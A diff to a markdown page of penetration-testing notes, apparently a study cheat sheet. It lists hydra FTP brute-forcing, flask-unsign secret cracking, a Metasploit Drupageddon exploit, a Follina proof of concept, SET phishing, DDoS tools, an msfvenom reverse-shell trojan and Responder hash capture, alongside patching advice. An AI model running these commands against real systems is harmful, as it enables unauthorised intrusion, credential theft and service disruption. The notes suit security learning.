@@ -1,62 +1,52 @@
 # Frameworks for Recording Threat Actions
 https://attack.mitre.org/
 
-# Exploitation is someone brute-forcing it with hydra
+## Exploitation is someone brute-forcing it with hydra
 hydra -L users.txt -P pass.txt IP_ADDRESS ftp -V
-
 
 # Intrusion Prevention System (IPS) is security system for catching and preventing security threats.
  ▪ It works on predefined security rules, just like IP
 
 https://www.snort.org/
 
-# How to Check What Ports are Opened on Your PC?
- ▪Windows: netstat –an, netstat –antb
+## How to Check What Ports are Opened on Your PC?
+ ▪ Windows: netstat –an, netstat –antb
  ▪ Unix: ss -nltp, netstat –tulpn
 
-
-* JWT Token Vulnerability
-# JWT's secret could be brute-forced like that
+# JWT Token Vulnerability
+## JWT's secret could be brute-forced like that
 
 flask-unsign -u -c .XXXXXXXXX -nE -w /usr/share/wordlists/rockyou.txt
 flask-unsign -s --secret "secret123" --cookie "{'loggin': True, 'username': 'blue'}" -l
 
 sudo -l
 
-
-How to Search for Vulnerabilities?
+## How to Search for Vulnerabilities?
 ExploitDB
 https://www.exploit-db.com/
 
 
-Drupal7
-Versions 7.0 to 7.31 are vulnerable to SQL Injection
+## Drupal7  (Versions 7.0 to 7.31 are vulnerable to SQL Injection)
 
-smsf6 exploit(multi/http/drupal_drupageddon) > show options
-msf6 exploit(multi/http/drupal_drupageddon) > exploit
+-> smsf6 exploit(multi/http/drupal_drupageddon) > show options
+-> msf6 exploit(multi/http/drupal_drupageddon) > exploit
 
+## How to Prevent Obsolete Software Vulnerabilities?
 
-How to Prevent Obsolete Software Vulnerabilities?
+▪ Updates are not just for new functionalities, most of them are designed for fixing security problems –ALWAYS BE UPDATED!
+▪ Look for updates in different aspects of your context, for example if the Wordpressengine is the latest version, but the plugins inside are outdated, the same problems can occur.
+▪ Look at your system as a whole, donot divide it. If you update any aspect of it, make sure to update all other subsystems
 
- ▪Updates are not just for new functionalities, most of them are designed for fixing security problems –ALWAYS BE UPDATED!
- ▪Look for updates in different aspects of your context, for example if the Wordpressengine is the latest version, but the plugins inside are outdated, the same problems can occur.
- ▪Look at your system as a whole, donot divide it. If you update any aspect of it, make sure to update all other subsystems
-
-* If you are wondering how long does it takes to break your password, you can try it here: 
-https://www.passwordmonster.com
-
-
-How to brute-force a Password?
+## How to brute-force a Password?
 
 ▪ Using hydra (https://github.com/vanhauser-thc/thc-hydra)
 
 Let's see more: 
-https://hashcat.net/wiki/doku.php?id=example_hashes
 
+▪ https://hashcat.net/wiki/doku.php?id=example_hashes
+▪ https://crackstation.net
 
-https://crackstation.net
-
-Get hash with Responder 
+## Get hash with Responder 
 https://github.com/SpiderLabs/Responder
 
 
@@ -67,33 +57,27 @@ https://0day.today
 python3 follina.py -r 9999
 https://www.hackthebox.com/blog/cve-2022-30190-follina-explained
 
-▪Log4j used for logging utility based on Java
+▪ Log4j used for logging utility based on Java
 
-
-More Databases for Vulnerabilities ☺
+## More Databases for Vulnerabilities:
 
  ▪https://www.cve.org/
  ▪https://www.exploit-db.com/
  ▪https://nvd.nist.gov/
  ▪https://www.cvedetails.com
 
-Live Cyber Threat Map
-
-https://threatmap.checkpoint.com/
-
-
 # Frameworks to Perform Wi-Fi Attacks
 
-▪Airgeddon(https://github.com/v1s1t0r1sh3r3/airgeddon)
-▪WiFiPhisher(https://github.com/wifiphisher/wifiphisher)
-▪WiFiExploitation Framework (https://github.com/D3Ext/WEF)
+▪ Airgeddon(https://github.com/v1s1t0r1sh3r3/airgeddon)
+▪ WiFiPhisher(https://github.com/wifiphisher/wifiphisher)
+▪ WiFiExploitation Framework (https://github.com/D3Ext/WEF)
  
 python listener.py
  ▪Source: https://www.youtube.com/watch?v=A8DkVDQW1-w
 
 Technical Side of Phishing Attacks is Scary Easy to Replicate
-
 https://github.com/trustedsec/social-engineer-toolkit
+
 sudo setoolkit
 
 Select from the menu:
@@ -117,13 +101,11 @@ LOIC (https://sourceforge.net/projects/loic/)–TCP, UDP, HTTP
 GET FLOODS
  ▪HOIC (https://sourceforge.net/projects/highorbitioncannon/)
  HTTP GET / POST requests
- ▪hping3(https://www.kali.org/tools/hping3/)
- ▪TorsHammer
- (https://github.com/Karlheinzniebuhr/torshammer
+ ▪hping3: https://www.kali.org/tools/hping3/
+ ▪TorsHammer: https://github.com/Karlheinzniebuhr/torshammer
 
 
-
-How to Generate Simple (and Detectable of Course) Trojan for Reverse Shell Callback?
+## How to Generate Simple (and Detectable of Course) Trojan for Reverse Shell Callback?
 
 MSFvenom(MSFvenom-MetasploitUnleashed (offensive security.com))
  ▪msfvenom–p windows/x64/shell/reverse_tcpLHOST=IP 
@@ -143,7 +125,6 @@ There are many types of SQL Injection attacks, such as: error based, stacked que
 
 smsf6 exploit(multi/http/drupal_drupageddon) > show options
 msf6 exploit(multi/http/drupal_drupageddon) > exploit
-
 
 # Brute Forcing Attacks
  ▪Example software for performing the attack:
@@ -169,8 +150,8 @@ ps -aef --forest
  ▪BurpSuite(https://portswigger.net/burp)
  ▪Searchsploit(https://www.exploit-db.com/searchsploit)
 
-Scanning local system for *privilege escalation attack vectors with 
-linpeas(https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
+## Scanning local system for *privilege escalation* attack vectors with linpeas
+https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
 
 ▪ On github: https://github.com/juliocesarfort/public-pentesting-reports
 
